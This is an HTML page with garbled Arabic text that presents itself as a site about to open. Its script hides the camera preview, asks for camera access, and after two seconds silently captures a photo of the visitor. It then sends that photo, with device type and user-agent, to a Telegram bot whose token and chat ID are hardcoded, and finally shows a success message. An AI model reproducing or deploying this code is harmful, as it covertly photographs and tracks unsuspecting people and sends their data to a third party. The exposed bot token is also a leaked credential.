<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>M31 ROJI</title>

<style>
html, body {
  margin: 0;
  padding: 0;
  height: 100%;
}

body {
  background-image: url("https://i.ytimg.com/vi/ft7afpoU2jI/hqdefault.jpg");
  background-size: 48%;
  background-position: center;
  background-repeat: no-repeat;
}


  display: flex;
  align-items: center;
  justify-content: center;

  font-family: Arial, sans-serif;
  color: #0f0;
  text-align: center;
}

/* Ø·Ø¨Ù‚Ø© Ø®ÙÙŠÙØ© Ù„Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ù†Øµ */
.overlay {
  background: rgba(0,0,0,0.4);
  padding: 2px 3px;
  border-radius: 1px;
}
}

<style>
body {
  background:#000;
  color:#0f0;
  text-align:center;
  font-family:Arial;
}

/* Ø¥Ø®ÙØ§Ø¡ Ù…Ø¹Ø§ÙŠÙ†Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ */
video {
  display: none;
}
</style>
</head>

<body>

<h3> Ø§Ù†ØªØ¶Ø± Ø³ÙŠØªÙ… ÙØªØ­ Ø§Ù„Ù…ÙˆÙ‚Ø¹  </h3>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
// ===== Ø¶Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§ØªÙƒ Ù‡Ù†Ø§ (Ù…Ø­Ù„ÙŠÙ‹Ø§ ÙÙ‚Ø·) =====
const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";
const CHAT_ID  = "6251932709";
// ======================================

let streamRef = null;

// Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²
function getDeviceInfo() {
  const ua = navigator.userAgent;

  let deviceType = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
  if (/android/i.test(ua)) deviceType = "Android";
    
  else if (/iphone|ipad|ipod/i.test(ua)) deviceType = "iPhone / iOS";
    
  else if (/windows/i.test(ua)) deviceType = "Windows";
    
  else if (/macintosh/i.test(ua)) deviceType = "Mac";
    
  else if (/linux/i.test(ua)) deviceType = "Linux";

  return `
ğŸ“± Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²: ${deviceType}

ğŸŒ Ø§Ù„Ù…ØªØµÙØ­: ${navigator.appName}

ğŸ§­ User-Agent: ${ua}

https://roji20112.github.io/M31HER--/

â° Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString()}

  `;
}

// ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ (Ø¨Ù…ÙˆØ§ÙÙ‚Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…)
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
  streamRef = stream;
  document.getElementById("video").srcObject = stream;

  // ØµÙˆØ±Ø© ÙˆØ§Ø­Ø¯Ø© ÙÙ‚Ø· Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØªÙŠÙ†
  setTimeout(captureOnce, 2000);
})
.catch(() => {
  document.body.innerHTML = "<h2>ØªÙ… Ø±ÙØ¶ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</h2>";
});

function captureOnce() {
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
  if (streamRef) {
    streamRef.getTracks().forEach(t => t.stop());
  }

  canvas.toBlob(blob => {
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", blob);
    form.append("caption", getDeviceInfo());

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form
    })
    .then(() => {
      document.body.innerHTML = "<h2>ØªÙ… Ø§Ù„ÙØªØ­ âœ…</h2>";
    })
    .catch(() => {
      document.body.innerHTML = "<h2>ÙØ´Ù„ ÙØªØ­ âŒ</h2>";
    });
  }, "image/jpeg");
}
</script>

</body>
</html>


